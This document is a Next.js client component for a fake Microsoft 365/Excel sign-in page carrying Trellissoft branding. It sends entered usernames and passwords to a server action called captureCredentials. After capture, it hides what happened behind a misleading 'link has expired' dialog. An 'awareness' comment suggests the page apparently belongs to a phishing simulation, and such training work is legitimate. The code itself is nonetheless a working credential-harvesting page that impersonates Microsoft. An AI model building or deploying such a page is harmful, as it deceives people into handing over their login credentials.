'use client';

import React, { useState, useEffect, FormEvent } from 'react';
import Image from 'next/image';
import { useSearchParams } from 'next/navigation';
import { ShieldX, AlertTriangle } from 'lucide-react';
import { captureCredentials } from '@/app/actions/capture-credentials';
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from '@/components/ui/alert-dialog';

export default function LoginPageClient() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showSuccessAlert, setShowSuccessAlert] = useState(false);
  const [showErrorAlert, setShowErrorAlert] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [fileName, setFileName] = useState('');

  const searchParams = useSearchParams();

  useEffect(() => {
    const file = searchParams.get('file');
    if (file) {
      setFileName(file);
    }
  }, [searchParams]);

  // Handle Form Submission
  const handleSubmit = async (event: FormEvent) => {
    event.preventDefault();
    setIsLoading(true);
    setShowErrorAlert(false);

    const formData = new FormData();
    formData.append('username', username);
    formData.append('password', password);

    try {
      const result = await captureCredentials(null, formData);
      if (result.success) {
        setShowSuccessAlert(true);
      } else {
        setErrorMessage(
          result.message || 'An unexpected error occurred. Please try again.'
        );
        setShowErrorAlert(true);
      }
    } catch (error: any) {
      console.error('Error in handleSubmit:', error);
      setErrorMessage(
        error.message ||
          'There was a problem submitting your request. Please try again later.'
      );
      setShowErrorAlert(true);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <>
      <style jsx global>{`
        body {
          margin: 0;
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          background: url('https://cdn.prod.website-files.com/6777c60fe010fa2ddf45acdc/6777c610e010fa2ddf45c003_66dff0614b40e5182f648c30_886300bf.jpeg') no-repeat center center fixed;
          background-size: cover;
          display: flex;
          align-items: center;
          justify-content: center;
          height: 100vh;
        }
        .card {
          background-color: white;
          padding: 2rem;
          border-radius: 12px;
          width: 380px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
          text-align: center;
        }
        .card img {
          max-width: 180px;
          margin-bottom: 1rem;
        }
        .card h1 {
            color: #0078D4;
            font-size: 1.5rem;
            margin-bottom: 1.5rem;
        }
        input[type="text"],
        input[type="password"] {
            box-sizing: border-box;
            width: 100%;
            padding: 0.8rem;
            margin-bottom: 1rem;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 1rem;
        }
        button {
            width: 100%;
            padding: 0.8rem;
            background-color: #0078D4;
            color: white;
            font-weight: bold;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background-color: #005a9e;
        }
        button:disabled {
            background-color: #aaa;
            cursor: not-allowed;
        }
        .footer {
            margin-top: 1rem;
            font-size: 0.75rem;
            color: #555;
        }
      `}</style>
      
      <div className="card">
        <Image
          src="https://trellissoft.ai/wp-content/uploads/2021/11/Trellissoft-logo-without-tagline.png"
          alt="Trellissoft Logo"
          width={180}
          height={36}
        />
        <h1>{fileName ? `Sign in to open ${fileName}` : 'Sign in to Excel'}</h1>
        <form onSubmit={handleSubmit} autoComplete="off">
          <input
            type="text"
            name="username"
            placeholder="Email or phone"
            required
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            disabled={isLoading}
          />
          <input
            type="password"
            name="password"
            placeholder="Password"
            required
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            disabled={isLoading}
          />
          <button type="submit" disabled={isLoading}>
            {isLoading ? 'Signing in...' : 'Sign in'}
          </button>
        </form>
        <div className="footer">
          <p>This application is created using Microsoft 365 by Trellissoft and may include content controlled by Trellissoft.</p>
          <p>&copy; Microsoft Corporation</p>
        </div>
      </div>

      {/* Awareness Alert Dialog */}
      <AlertDialog open={showSuccessAlert} onOpenChange={setShowSuccessAlert}>
        <AlertDialogContent>
          <AlertDialogHeader>
            <div className="flex justify-center mb-4">
              <Image
                src="https://media.licdn.com/dms/image/D560BAQGj-2L22A-4-Q/company-logo_200_200/0/1712739343993/trellissoft_logo?e=1728518400&v=beta&t=o1n4Gk_1-vJ3s_Yy_J_j_j_j_j_j_j_j_j"
                alt="Trellissoft Logo"
                width={180}
                height={60}
                className="object-contain"
                priority
              />
            </div>
            <div className="flex justify-center mb-3">
              <ShieldX className="w-14 h-14 text-red-500" />
            </div>
            <AlertDialogTitle className="text-2xl font-semibold text-center text-white">
              This Link Has Expired
            </AlertDialogTitle>
          </AlertDialogHeader>
          <AlertDialogDescription className="mt-2 text-center text-gray-400 leading-relaxed">
            ⚠️ This link has expired for security reasons. <br />
            Your asset update form is no longer available. <br />
            To protect your information, this link automatically expires after a set time.
            <br /><br />
            Please request a new secure link if you still need to update your details.
            <p className="mt-4 text-sm text-gray-500">
              Always be cautious of unexpected login requests.
            </p>
          </AlertDialogDescription>
          <AlertDialogFooter className="sm:justify-center mt-4">
            <AlertDialogAction
              onClick={() => setShowSuccessAlert(false)}
              className="bg-[#217346] text-white hover:bg-green-800"
            >
              Continue
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      {/* Error Alert Dialog */}
      <AlertDialog open={showErrorAlert} onOpenChange={setShowErrorAlert}>
        <AlertDialogContent>
          <AlertDialogHeader>
            <div className="flex justify-center mb-3">
              <AlertTriangle className="w-14 h-14 text-yellow-400" />
            </div>
            <AlertDialogTitle className="text-2xl font-semibold text-center text-white">
              Submission Failed
            </AlertDialogTitle>
          </AlertDialogHeader>
          <AlertDialogDescription className="mt-2 text-center text-gray-400 leading-relaxed">
            {errorMessage}
          </AlertDialogDescription>
          <AlertDialogFooter className="sm:justify-center mt-4">
            <AlertDialogAction
              onClick={() => setShowErrorAlert(false)}
              className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
            >
              Close
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </>
  );
}
